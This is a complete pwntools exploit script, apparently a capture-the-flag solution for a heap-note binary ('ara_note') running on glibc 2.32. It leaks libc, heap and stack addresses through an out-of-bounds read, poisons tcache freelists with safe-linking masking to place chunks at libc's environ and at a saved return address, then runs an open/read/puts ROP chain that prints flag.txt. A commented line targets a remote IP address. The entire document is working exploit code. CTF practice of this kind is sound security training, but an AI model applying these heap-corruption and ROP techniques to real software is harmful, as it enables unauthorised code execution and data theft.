from pwn import *

libc = ELF("./libc-2.32.so")
p = process("./ara_note", env={"LD_PRELOAD": libc.path})
# p = remote("45.32.116.131", 1024)

def alloc(idx, size):
  p.sendlineafter("> ", "1")
  p.sendlineafter("index: ", str(idx))
  p.sendlineafter("chunk: ", str(size))

def free(idx):
  p.sendlineafter("> ", "2")
  p.sendlineafter("index: ", str(idx))

def view(idx, size):
  p.sendlineafter("> ", "3")
  p.sendlineafter("index: ", str(idx))
  p.sendlineafter("view: ", str(size))

def edit(idx, size, data):
  p.sendlineafter("> ", "4")
  p.sendlineafter("index: ", str(idx))
  p.sendlineafter("edit: ", str(size))
  p.sendlineafter("Data : ", data)

def mask(heap_base, target):
  return target ^ (heap_base >> 0xc)

alloc(0, 0x80)
alloc(1, 0x508)
alloc(2, 0x410)

free(1)
view(0, 0x90 + 0x8)
libc_leak = u64(p.recvline()[144:-42].ljust(8, '\x00'))
log.info("Libc leak: {}".format(hex(libc_leak)))
libc_base = libc_leak - 0x1e3c00
log.info("Libc base: {}".format(hex(libc_base)))
libc_puts = libc_base + 0x0000000000080d90
log.info("Libc puts: {}".format(hex(libc_puts)))
libc_environ = libc_base + 0x00000000001e7600
log.info("Libc environ: {}".format(hex(libc_environ)))
libc_read = libc_base + 0x0000000000108ca0
log.info("Libc read: {}".format(hex(libc_read)))
pop_rdi = libc_base + 0x000000000002858f
log.info("Pop rdi: {}".format(hex(pop_rdi)))
pop_rsi = libc_base + 0x000000000002ac3f
log.info("Pop rsi: {}".format(hex(pop_rsi)))
pop_rdx_rbx = libc_base + 0x00000000001597d6
log.info("Pop rdx rbx: {}".format(hex(pop_rdx_rbx)))
pop_rax = libc_base + 0x0000000000045580
log.info("Pop rax: {}".format(hex(pop_rax)))
syscall = libc_base + 0x0000000000046490
log.info("Syscall: {}".format(hex(syscall)))
pop_rcx = libc_base + 0x0000000000131a8a
log.info("Pop rcx: {}".format(hex(pop_rcx)))

for i in range(4,11): alloc(i, 0x100)
alloc(13, 0x20)
for i in range(10, 3, -1): free(i)

view(0, 0xa8)
heap_leak = u64(p.recvline()[160:-44].ljust(8, '\x00'))
log.info("Heap leak: {}".format(hex(heap_leak)))
heap_base = heap_leak - 0x320
log.info("Heap base: {}".format(hex(heap_base)))

poison = mask(heap_base, libc_environ)

alloc(4, 0x100)
edit(4, 0x118, 'A' * 0x100 + p64(0) + p64(0x111) + p64(poison))
alloc(5, 0x100)
alloc(6, 0x100)
view(6, 0x8)

stack_leak = u64(p.recvline()[:-42].ljust(8, '\x00'))
log.info("Stack leak: {}".format(hex(stack_leak)))
ret_addr = stack_leak - 0x140
log.info("Ret address: {}".format(hex(ret_addr)))
log.info("Overwrite in: {}".format(hex(ret_addr - 0x48)))

free(5)
free(4)

ret_poison = mask(heap_base, ret_addr - 0x48)

edit(0, 0xa8, 'B' * 0x80 + p64(0) + p64(0x111) + p64(ret_poison) + p64(0))
alloc(4, 0x100)
edit(4, 0x10, './flag.txt\x00')

alloc(5, 0x100)

flag_loc = heap_base + 0x330
log.info("Flag loc: {}".format(hex(flag_loc)))


payload = ''
payload += p64(pop_rdi)
payload += p64(flag_loc)
payload += p64(pop_rsi)
payload += p64(0)
payload += p64(pop_rdx_rbx)
payload += p64(0) * 2
payload += p64(pop_rcx)
payload += p64(0)
payload += p64(pop_rax)
payload += p64(2)
payload += p64(syscall)

payload += p64(pop_rdi)
payload += p64(3)
payload += p64(pop_rsi)
payload += p64(flag_loc)
payload += p64(pop_rdx_rbx)
payload += p64(0x100) * 2
payload += p64(libc_read)

payload += p64(pop_rdi)
payload += p64(flag_loc)
payload += p64(libc_puts)


# gdb.attach(p, 'pie b *0x000000000000137a')

edit(5, 0x100, 'C' * 0x8 + payload)


p.interactive()